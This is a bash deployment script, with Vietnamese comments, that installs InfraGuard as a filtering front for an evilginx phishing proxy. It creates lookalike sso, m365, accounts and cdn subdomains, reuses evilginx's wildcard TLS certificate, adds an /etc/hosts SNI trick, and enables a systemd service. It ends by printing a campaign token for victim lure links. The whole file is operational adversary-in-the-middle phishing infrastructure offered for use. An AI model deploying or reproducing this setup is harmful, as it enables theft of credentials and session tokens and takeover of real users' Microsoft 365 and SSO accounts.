#!/usr/bin/env bash
# setup_infraguard.sh — clone InfraGuard + venv + render config + hosts trick + systemd
# Chạy TRÊN VPS (Ubuntu), từ thư mục deploy/ của repo đã clone.
#
# Env:
#   BASE / ZONE (bắt buộc)  EG_PORT=4443  LANDING_SUB=accounts
#   CAMPAIGN_TOKEN (tự sinh nếu trống)   IG_API_TOKEN (tự sinh nếu trống)
#   IG_HOME=/opt/infraguard   IG_REPO=https://github.com/Whispergate/InfraGuard.git
set -euo pipefail

BASE="${BASE:?BASE required}"
ZONE="${ZONE:?ZONE required}"
EG_PORT="${EG_PORT:-4443}"
LANDING_SUB="${LANDING_SUB:-accounts}"
IG_HOME="${IG_HOME:-/opt/infraguard}"
IG_REPO="${IG_REPO:-https://github.com/Whispergate/InfraGuard.git}"

DEPLOY_DIR="$(cd "$(dirname "$0")" && pwd)"
BASE_FQDN="${BASE}.${ZONE}"
SNI_HOST="${LANDING_SUB}.${BASE_FQDN}"

LANDING_FQDN="${LANDING_SUB}.${BASE_FQDN}"
WWW_FQDN="www.${BASE_FQDN}"
CDN1_FQDN="cdn-1.${BASE_FQDN}"
CDN2_FQDN="cdn-2.${BASE_FQDN}"
CDN3_FQDN="cdn-3.${BASE_FQDN}"
CDN4_FQDN="cdn-4.${BASE_FQDN}"
SSO_FQDN="sso.${BASE_FQDN}"
M365_FQDN="m365.${BASE_FQDN}"
EVENTS_FQDN="events.${BASE_FQDN}"

CAMPAIGN_TOKEN="${CAMPAIGN_TOKEN:-}"
TOKEN_FILE="$HOME/.evilginx/campaign-token"
if [ -z "$CAMPAIGN_TOKEN" ]; then
  if [ -f "$TOKEN_FILE" ]; then CAMPAIGN_TOKEN="$(cat "$TOKEN_FILE")";
  else CAMPAIGN_TOKEN="$(openssl rand -hex 16)"; fi
fi
mkdir -p "$(dirname "$TOKEN_FILE")"
echo -n "$CAMPAIGN_TOKEN" > "$TOKEN_FILE"   # persist — deploy.sh/verify đọc lại từ đây
IG_API_TOKEN="${IG_API_TOKEN:-$(openssl rand -hex 24)}"
IG_TLS_CERT="${HOME}/.evilginx/crt/sites/wildcard-${BASE}/fullchain.pem"
IG_TLS_KEY="${HOME}/.evilginx/crt/sites/wildcard-${BASE}/privkey.pem"

[ -f "$IG_TLS_CERT" ] || { echo "FAIL: wildcard cert chưa có — chạy stage certs/evilginx trước"; exit 1; }

echo "=== [1/5] clone/install InfraGuard (${IG_HOME}) ==="
if [ ! -d "$IG_HOME" ]; then
  sudo git clone "$IG_REPO" "$IG_HOME"
  sudo chown -R "$(whoami)" "$IG_HOME"
fi
if [ ! -x "$IG_HOME/.venv/bin/infraguard" ]; then
  (cd "$IG_HOME" && python3 -m venv .venv && ./.venv/bin/pip install -q -e .)
fi
"$IG_HOME/.venv/bin/infraguard" --help >/dev/null 2>&1 && echo "infraguard CLI OK"

echo "=== [2/5] /etc/hosts SNI trick (${SNI_HOST} -> 127.0.0.1) ==="
# httpx sẽ connect upstream https://${SNI_HOST}:${EG_PORT} — hosts map về loopback
# để TLS SNI gửi lên evilginx khớp wildcard cert (thay vì "127.0.0.1" → handshake fail)
if grep -q "[[:space:]]${SNI_HOST}" /etc/hosts; then
  echo "hosts entry đã tồn tại — skip"
else
  echo "127.0.0.1 ${SNI_HOST}" | sudo tee -a /etc/hosts >/dev/null
  echo "hosts entry added"
fi

echo "=== [3/5] render config.yaml ==="
sudo mkdir -p "$IG_HOME/config" "$IG_HOME/data" "$IG_HOME/rules"
TPL="$DEPLOY_DIR/templates/infraguard.config.yaml.tpl"
sed -e "s|\${EG_PORT}|${EG_PORT}|g" \
    -e "s|\${SNI_HOST}|${SNI_HOST}|g" \
    -e "s|\${BASE}|${BASE}|g" \
    -e "s|\${ZONE}|${ZONE}|g" \
    -e "s|\${IG_TLS_CERT}|${IG_TLS_CERT}|g" \
    -e "s|\${IG_TLS_KEY}|${IG_TLS_KEY}|g" \
    -e "s|\${IG_HOME}|${IG_HOME}|g" \
    -e "s|\${IG_API_TOKEN}|${IG_API_TOKEN}|g" \
    -e "s|\${CAMPAIGN_TOKEN}|${CAMPAIGN_TOKEN}|g" \
    -e "s|\${LANDING_FQDN}|${LANDING_FQDN}|g" \
    -e "s|\${WWW_FQDN}|${WWW_FQDN}|g" \
    -e "s|\${CDN1_FQDN}|${CDN1_FQDN}|g" \
    -e "s|\${CDN2_FQDN}|${CDN2_FQDN}|g" \
    -e "s|\${CDN3_FQDN}|${CDN3_FQDN}|g" \
    -e "s|\${CDN4_FQDN}|${CDN4_FQDN}|g" \
    -e "s|\${SSO_FQDN}|${SSO_FQDN}|g" \
    -e "s|\${M365_FQDN}|${M365_FQDN}|g" \
    -e "s|\${EVENTS_FQDN}|${EVENTS_FQDN}|g" \
    "$TPL" | sudo tee "$IG_HOME/config/config.yaml" >/dev/null
echo "config.yaml rendered"

echo "=== [4/5] .env (InfraGuard placeholders — config đã render sẵn giá trị) ==="
sudo tee "$IG_HOME/.env" >/dev/null <<ENVEOF
# rendered config chứa giá trị thật; file này chỉ để thỏa EnvironmentFile của unit
IG_RENDERED=1
ENVEOF

echo "=== [5/5] systemd unit + enable ==="
sed -e "s|\${IG_HOME}|${IG_HOME}|g" \
    "$DEPLOY_DIR/templates/infraguard.service.tpl" | sudo tee /etc/systemd/system/infraguard.service >/dev/null
sudo systemctl daemon-reload
sudo systemctl enable --now infraguard
sleep 4
systemctl is-active infraguard
sudo ss -tlnp | grep ":443 " | head -2

cat <<EOF

DONE infraguard stage.
  CAMPAIGN_TOKEN (lưu lại — link victim): ?t=${CAMPAIGN_TOKEN}
  Kiểm tra: curl -sk "https://127.0.0.1/<lure-path>?t=${CAMPAIGN_TOKEN}" -H "Host: ${LANDING_FQDN}"
  (xem tiếp stage verify của deploy.sh)
EOF
